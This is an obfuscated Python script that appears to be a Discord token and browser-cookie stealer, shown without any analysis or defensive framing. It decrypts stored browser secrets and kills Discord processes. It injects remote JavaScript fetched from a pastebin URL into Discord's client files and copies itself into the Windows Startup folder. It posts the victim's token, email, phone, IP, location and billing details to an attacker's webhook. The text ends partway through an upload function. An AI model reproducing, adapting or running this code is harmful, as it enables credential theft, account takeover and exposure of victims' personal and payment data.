import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
import sys #line:17
import shutil #line:18
import uuid #line:19
import socket #line:20
import getpass #line:21
DETECTED =False #line:24
def g3t1p ():#line:26
    O0O00000O00OOOO00 ="None"#line:27
    try :#line:28
        O0O00000O00OOOO00 =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:29
    except :#line:30
        pass #line:31
    return O0O00000O00OOOO00 #line:32
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:37
for modl in requirements :#line:38
    try :__import__ (modl [0 ])#line:39
    except :#line:40
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:41
        time .sleep (3 )#line:42
import requests #line:44
from Crypto .Cipher import AES #line:45
local =os .getenv ('LOCALAPPDATA')#line:47
roaming =os .getenv ('APPDATA')#line:48
temp =os .getenv ("TEMP")#line:49
Threadlist =[]#line:50
class DATA_BLOB (Structure ):#line:53
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:57
def G3tD4t4 (O0O000OOO00OOOOO0 ):#line:59
    OOOO0O0OOO0000OO0 =int (O0O000OOO00OOOOO0 .cbData )#line:60
    O0O0OOOOO0OO0OOO0 =O0O000OOO00OOOOO0 .pbData #line:61
    OO0OOOOO00O00OOOO =c_buffer (OOOO0O0OOO0000OO0 )#line:62
    cdll .msvcrt .memcpy (OO0OOOOO00O00OOOO ,O0O0OOOOO0OO0OOO0 ,OOOO0O0OOO0000OO0 )#line:63
    windll .kernel32 .LocalFree (O0O0OOOOO0OO0OOO0 )#line:64
    return OO0OOOOO00O00OOOO .raw #line:65
def CryptUnprotectData (OOOO00OO0OOOO0O0O ,entropy =b''):#line:67
    OOOO00000O0OOO000 =c_buffer (OOOO00OO0OOOO0O0O ,len (OOOO00OO0OOOO0O0O ))#line:68
    O00OOOOO0OO0O00OO =c_buffer (entropy ,len (entropy ))#line:69
    OO0OO0O0O00OOOOO0 =DATA_BLOB (len (OOOO00OO0OOOO0O0O ),OOOO00000O0OOO000 )#line:70
    O0OO00O00000O0O0O =DATA_BLOB (len (entropy ),O00OOOOO0OO0O00OO )#line:71
    O0000O00OO00OO0OO =DATA_BLOB ()#line:72
    if windll .crypt32 .CryptUnprotectData (byref (OO0OO0O0O00OOOOO0 ),None ,byref (O0OO00O00000O0O0O ),None ,None ,0x01 ,byref (O0000O00OO00OO0OO )):#line:74
        return G3tD4t4 (O0000O00OO00OO0OO )#line:75
def D3kryptV4lU3 (OO000O0O0O000OOO0 ,master_key =None ):#line:77
    O0O00000OOOO00OOO =OO000O0O0O000OOO0 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:78
    if O0O00000OOOO00OOO =='v10'or O0O00000OOOO00OOO =='v11':#line:79
        O0O00O0O00OO0O0OO =OO000O0O0O000OOO0 [3 :15 ]#line:80
        O00OO0OOOOO000O0O =OO000O0O0O000OOO0 [15 :]#line:81
        OO00O000OOO0000O0 =AES .new (master_key ,AES .MODE_GCM ,O0O00O0O00OO0O0OO )#line:82
        OO00OO0O0O00000O0 =OO00O000OOO0000O0 .decrypt (O00OO0OOOOO000O0O )#line:83
        OO00OO0O0O00000O0 =OO00OO0O0O00000O0 [:-16 ].decode ()#line:84
        return OO00OO0O0O00000O0 #line:85
def L04dR3qu3sTs (O000OO0OOOO0OOOOO ,O00OO00O000OO0O0O ,data ='',files ='',headers =''):#line:87
    for OO00OO0OO0OOOO00O in range (8 ):#line:88
        try :#line:89
            if O000OO0OOOO0OOOOO =='POST':#line:90
                if data !='':#line:91
                    OOOO00OOOOO0O00O0 =requests .post (O00OO00O000OO0O0O ,data =data )#line:92
                    if OOOO00OOOOO0O00O0 .status_code ==200 :#line:93
                        return OOOO00OOOOO0O00O0 #line:94
                elif files !='':#line:95
                    OOOO00OOOOO0O00O0 =requests .post (O00OO00O000OO0O0O ,files =files )#line:96
                    if OOOO00OOOOO0O00O0 .status_code ==200 or OOOO00OOOOO0O00O0 .status_code ==413 :#line:97
                        return OOOO00OOOOO0O00O0 #line:98
        except :#line:99
            pass #line:100
def L04durl1b (OO0O00O0O0OO00OO0 ,data ='',files ='',headers =''):#line:102
    for OO0OOOOO00OOO0OO0 in range (8 ):#line:103
        try :#line:104
            if headers !='':#line:105
                OOOO0O00O000OO000 =urlopen (Request (OO0O00O0O0OO00OO0 ,data =data ,headers =headers ))#line:106
                return OOOO0O00O000OO000 #line:107
            else :#line:108
                OOOO0O00O000OO000 =urlopen (Request (OO0O00O0O0OO00OO0 ,data =data ))#line:109
                return OOOO0O00O000OO000 #line:110
        except :#line:111
            pass #line:112
def globalInfo ():#line:114
    O00O0OO0O00OOO0O0 =g3t1p ()#line:115
    OO0O0OO00O00OO0OO =os .getenv ("USERNAME")#line:116
    O0OOOOO0O0OOO0O0O =urlopen (Request (f"https://geolocation-db.com/jsonp/{O00O0OO0O00OOO0O0}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:117
    OO0O00000O0O0000O =loads (O0OOOOO0O0OOO0O0O )#line:118
    O000OOOOOOO0O0O00 =OO0O00000O0O0000O ["country_name"]#line:119
    OO0O00O000OO000OO =OO0O00000O0O0000O ["country_code"].lower ()#line:120
    OOO0OOOOO0O0O0O00 =OO0O00000O0O0000O ["state"]#line:121
    O00OOO0000O00O0OO =f":flag_{OO0O00O000OO000OO}:  - `{OO0O0OO00O00OO0OO.upper()} | {O00O0OO0O00OOO0O0} ({O000OOOOOOO0O0O00})`"#line:123
    return O00OOO0000O00O0OO #line:124
def TR6st (OOOO0O0O00OOO00O0 ):#line:127
    global DETECTED #line:128
    OOOO000O0OO0000O0 =str (OOOO0O0O00OOO00O0 )#line:129
    O00OOOOO00OOO00O0 =re .findall (".google.com",OOOO000O0OO0000O0 )#line:130
    if len (O00OOOOO00OOO00O0 )<-1 :#line:131
        DETECTED =True #line:132
        return DETECTED #line:133
    else :#line:134
        DETECTED =False #line:135
        return DETECTED #line:136
def G3tUHQFr13ndS (OO0O00O0OOO000OOO ):#line:138
    OOO000000O0O0O0OO =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:150
    OO00O000O00O0O00O ={"Authorization":OO0O00O0OOO000OOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:155
    try :#line:156
        OOOO00OOO0000O0OO =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OO00O000O00O0O00O )).read ().decode ())#line:157
    except :#line:158
        return False #line:159
    O0000OO0OOOO0OOO0 =''#line:161
    for OO0OOOO000OOO0O0O in OOOO00OOO0000O0OO :#line:162
        O0000O0OO00O0O0OO =''#line:163
        O00OOOO000OO00O00 =OO0OOOO000OOO0O0O ['user']['public_flags']#line:164
        for O0OOOOOO0O00000O0 in OOO000000O0O0O0OO :#line:165
            if O00OOOO000OO00O00 //O0OOOOOO0O00000O0 ["Value"]!=0 and OO0OOOO000OOO0O0O ['type']==1 :#line:166
                if not "House"in O0OOOOOO0O00000O0 ["Name"]:#line:167
                    O0000O0OO00O0O0OO +=O0OOOOOO0O00000O0 ["Emoji"]#line:168
                O00OOOO000OO00O00 =O00OOOO000OO00O00 %O0OOOOOO0O00000O0 ["Value"]#line:169
        if O0000O0OO00O0O0OO !='':#line:170
            O0000OO0OOOO0OOO0 +=f"{O0000O0OO00O0O0OO} | {OO0OOOO000OOO0O0O['user']['username']}#{OO0OOOO000OOO0O0O['user']['discriminator']} ({OO0OOOO000OOO0O0O['user']['id']})\n"#line:171
    return O0000OO0OOOO0OOO0 #line:172
process_list =os .popen ('tasklist').readlines ()#line:175
for process in process_list :#line:178
    if "Discord"in process :#line:179
        pid =int (process .split ()[1 ])#line:181
        os .system (f"taskkill /F /PID {pid}")#line:182
def G3tb1ll1ng (O0OOO000O00O0O0OO ):#line:184
    OO00000O000O0OOOO ={"Authorization":O0OOO000O00O0O0OO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:189
    try :#line:190
        O0OO0OO00OO0000O0 =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OO00000O000O0OOOO )).read ().decode ())#line:191
    except :#line:192
        return False #line:193
    if O0OO0OO00OO0000O0 ==[]:return "```None```"#line:195
    OOO0000O0O0OO000O =""#line:197
    for O00O000O00O0OOOO0 in O0OO0OO00OO0000O0 :#line:198
        if O00O000O00O0OOOO0 ["invalid"]==False :#line:199
            if O00O000O00O0OOOO0 ["type"]==1 :#line:200
                OOO0000O0O0OO000O +=":credit_card:"#line:201
            elif O00O000O00O0OOOO0 ["type"]==2 :#line:202
                OOO0000O0O0OO000O +=":parking: "#line:203
    return OOO0000O0O0OO000O #line:205
inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ="https://pastebin.com/raw/BsZ18N9J"#line:207
def keywork ():#line:209
    OOOO0OO000000O0OO =os .getlogin ()#line:211
    O0OO0OOO0OOO000OO =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:213
    for O0000O00000OO0O0O in O0OO0OOO0OOO000OO :#line:215
        O0OO000O0000O0000 =os .path .join (os .getenv ('LOCALAPPDATA'),O0000O00000OO0O0O )#line:216
        if os .path .isdir (O0OO000O0000O0000 ):#line:217
            for O0000O000000O0OO0 ,O000OOOO0OO00O00O ,OO000O00OO0OO0000 in os .walk (O0OO000O0000O0000 ):#line:218
                if 'app-'in O0000O000000O0OO0 :#line:219
                    for O00OOO0OOO0O0O0O0 in O000OOOO0OO00O00O :#line:220
                        if 'modules'in O00OOO0OOO0O0O0O0 :#line:221
                            O0OOO00OO00O0O0O0 =os .path .join (O0000O000000O0OO0 ,O00OOO0OOO0O0O0O0 )#line:222
                            for O0OO0000OOO00O000 ,OOO00O0OOO00OO00O ,O0OOO000000OO0000 in os .walk (O0OOO00OO00O0O0O0 ):#line:223
                                if 'discord_desktop_core-'in O0OO0000OOO00O000 :#line:224
                                    for OO000000O0O000O00 ,OO00O0OO0OOO0OOOO ,O0OO0OO0O0O0O00OO in os .walk (O0OO0000OOO00O000 ):#line:225
                                        if 'discord_desktop_core'in OO000000O0O000O00 :#line:226
                                            for O0O0O0O0O0O000000 in O0OO0OO0O0O0O00OO :#line:227
                                                if O0O0O0O0O0O000000 =='index.js':#line:228
                                                    O0OOOOOO0O0OO00OO =os .path .join (OO000000O0O000O00 ,O0O0O0O0O0O000000 )#line:229
                                                    OO00O00000OOOO000 =requests .get (inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ).text #line:231
                                                    OO00O00000OOOO000 =OO00O00000OOOO000 .replace ("%WEBHOOK%",keyfast67f )#line:233
                                                    with open (O0OOOOOO0O0OO00OO ,"w",encoding ="utf-8")as O0OOO000000O0O0OO :#line:235
                                                        O0OOO000000O0O0OO .write (OO00O00000OOOO000 )#line:236
keywork ()#line:237
def G3tB4dg31 (OOOOOOOOOOOOOO00O ):#line:239
    if OOOOOOOOOOOOOO00O ==0 :return ''#line:240
    O0OOOO00O0O00O0OO =''#line:242
    OOO0O0OOOO0OO0000 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:254
    for OO0O00O0O0000O000 in OOO0O0OOOO0OO0000 :#line:255
        if OOOOOOOOOOOOOO00O //OO0O00O0O0000O000 ["Value"]!=0 :#line:256
            O0OOOO00O0O00O0OO +=OO0O00O0O0000O000 ["Emoji"]#line:257
            OOOOOOOOOOOOOO00O =OOOOOOOOOOOOOO00O %OO0O00O0O0000O000 ["Value"]#line:258
    return O0OOOO00O0O00O0OO #line:260
def G3tT0k4n1nf9 (O0OO0O00O00000O0O ):#line:262
    OOO0000O00OOOO0OO ={"Authorization":O0OO0O00O00000O0O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:267
    OO00OOO00O0000O0O =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOO0000O00OOOO0OO )).read ().decode ())#line:269
    OO00OOOOOOOOO0OO0 =OO00OOO00O0000O0O ["username"]#line:270
    OOO0OO0O00OOO0O0O =OO00OOO00O0000O0O ["discriminator"]#line:271
    OO0OO0OOOO00OO0OO =OO00OOO00O0000O0O ["email"]#line:272
    OOO000O0000000000 =OO00OOO00O0000O0O ["id"]#line:273
    OOOOO000O0000OOO0 =OO00OOO00O0000O0O ["avatar"]#line:274
    OOOOOOOO0O0O0OOOO =OO00OOO00O0000O0O ["public_flags"]#line:275
    O000OOOO0OOO000O0 =""#line:276
    O00OOOOOO0OO0O00O =""#line:277
    if "premium_type"in OO00OOO00O0000O0O :#line:279
        OO0000O0000OOO00O =OO00OOO00O0000O0O ["premium_type"]#line:280
        if OO0000O0000OOO00O ==1 :#line:281
            O000OOOO0OOO000O0 ="<a:DE_BadgeNitro:865242433692762122>"#line:282
        elif OO0000O0000OOO00O ==2 :#line:283
            O000OOOO0OOO000O0 ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:284
    if "ph0n3"in OO00OOO00O0000O0O :O00OOOOOO0OO0O00O =f'{OO00OOO00O0000O0O["ph0n3"]}'#line:285
    return OO00OOOOOOOOO0OO0 ,OOO0OO0O00OOO0O0O ,OO0OO0OOOO00OO0OO ,OOO000O0000000000 ,OOOOO000O0000OOO0 ,OOOOOOOO0O0O0OOOO ,O000OOOO0OOO000O0 ,O00OOOOOO0OO0O00O #line:287
def ch1ckT4k1n (O0O00OOOO000O000O ):#line:289
    O00O00000O0O0OO00 ={"Authorization":O0O00OOOO000O000O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:294
    try :#line:295
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O00O00000O0O0OO00 ))#line:296
        return True #line:297
    except :#line:298
        return False #line:299
if getattr (sys ,'frozen',False ):#line:301
    currentFilePath =os .path .dirname (sys .executable )#line:302
else :#line:303
    currentFilePath =os .path .dirname (os .path .abspath (__file__ ))#line:304
fileName =os .path .basename (sys .argv [0 ])#line:306
filePath =os .path .join (currentFilePath ,fileName )#line:307
startupFolderPath =os .path .join (os .path .expanduser ('~'),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')#line:309
startupFilePath =os .path .join (startupFolderPath ,fileName )#line:310
if os .path .abspath (filePath ).lower ()!=os .path .abspath (startupFilePath ).lower ():#line:312
    with open (filePath ,'rb')as src_file ,open (startupFilePath ,'wb')as dst_file :#line:313
        shutil .copyfileobj (src_file ,dst_file )#line:314
def upl05dT4k31 (OOO00O00O0OO00O00 ,OO0O000OOOOOO0OOO ):#line:317
    global keyfast67f #line:318
    O00O000OO0OOOO0O0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:322
    O00OOOO0OO0OO0OO0 ,O0OOO0O0OOOOO00OO ,O0OO000OO00O0OO00 ,O0OOOO0O0O000O000 ,OOOO00O0O0O0O0OOO ,OO0OO00OO0OOO0000 ,O0O00OO0OO0OO0000 ,OOO0OOO0O0OOOOO0O =G3tT0k4n1nf9 (OOO00O00O0OO00O00 )#line:323
    if OOOO00O0O0O0O0OOO ==None :#line:325
        OOOO00O0O0O0O0OOO =""#line:326
    else :#line:327
        OOOO00O0O0O0O0OOO =f"https://cdn.discordapp.com/avatars/{O0OOOO0O0O000O000}/{OOOO00O0O0O0O0OOO}"#line:328
    O00OO00O000000OO0 =G3tb1ll1ng (OOO00O00O0OO00O00 )#line:330
    O0O00OO00O00OOO0O =G3tB4dg31 (OO0OO00OO0OOO0000 )#line:331
    OO00OOOO0O000OOOO =G3tUHQFr13ndS (OOO00O00O0OO00O00 )#line:332
    if OO00OOOO0O000OOOO =='':OO00OOOO0O000OOOO ="```No Rare Friends```"#line:333
    if not O00OO00O000000OO0 :#line:334
        O0O00OO00O00OOO0O ,OOO0OOO0O0OOOOO0O ,O00OO00O000000OO0 ="🔒","🔒","🔒"#line:335
    if O0O00OO0OO0OO0000 ==''and O0O00OO00O00OOO0O =='':O0O00OO0OO0OO0000 ="```None```"#line:336
    O00O0000OOO00O0OO ={"content":f'{globalInfo()} | `{OO0O000OOOOOO0OOO}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OOO00O00O0OO00O00}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{O0OO000OO00O0OO00}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{OOO0OOO0O0OOOOO0O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{O0O00OO0OO0OO0000}{O0O00OO00O00OOO0O}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O00OO00O000000OO0}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{OO00OOOO0O000OOOO}","inline":False }],"author":{"name":f"{O00OOOO0OO0OO0OO0}#{O0OOO0O0OOOOO00OO} ({O0OOOO0O0O000O000})","icon_url":f"{OOOO00O0O0O0O0OOO}"},"footer":{"text":"unknown","icon_url":""},"thumbnail":{"url":f"{OOOO00O0O0O0O0OOO}"}}],"avatar_url":"","username":"unknown","attachments":[]}#line:396
    L04durl1b (keyfast67f ,data =dumps (O00O0000OOO00O0OO ).encode (),headers =O00O000OO0OOOO0O0 )#line:397
def R4f0rm3t (OO0OO00OO000O000O ):#line:400
    OO0OO00O0OOOO00O0 =re .findall ("(\w+[a-z])",OO0OO00OO000O000O )#line:401
    while "https"in OO0OO00O0OOOO00O0 :OO0OO00O0OOOO00O0 .remove ("https")#line:402
    while "com"in OO0OO00O0OOOO00O0 :OO0OO00O0OOOO00O0 .remove ("com")#line:403
    while "net"in OO0OO00O0OOOO00O0 :OO0OO00O0OOOO00O0 .remove ("net")#line:404
    return list (set (OO0OO00O0OOOO00O0 ))#line:405
def upload (O0000OOOOO00OO0OO ,OO00OO0O000O00000 ):#line:407
    O000000O0OOO0OO0O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:411
    if O0000OOOOO00OO0OO =="crcook":#line:413
        O000OO000OO0OOOOO =' | '.join (OO0OO0O0O0OO000OO for OO0OO0O0O0OO000OO in cookiWords )#line:414
        if len (O000OO000OO0OOOOO )>1000 :#line:415
            OOO00O0O0OO0OO00O =R4f0rm3t (str (cookiWords ))#line:416
            O000OO000OO0OOOOO =' | '.join (OO0OO0000O0OO000O for OO0OO0000O0OO000O in OOO00O0O0OO0OO00O )#line:417
        O00O0000OOOO0OOOO ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{O000OO000OO0OOOOO}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownCookies.txt]({OO00OO0O000O00000})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg","attachments":[]}#line:434
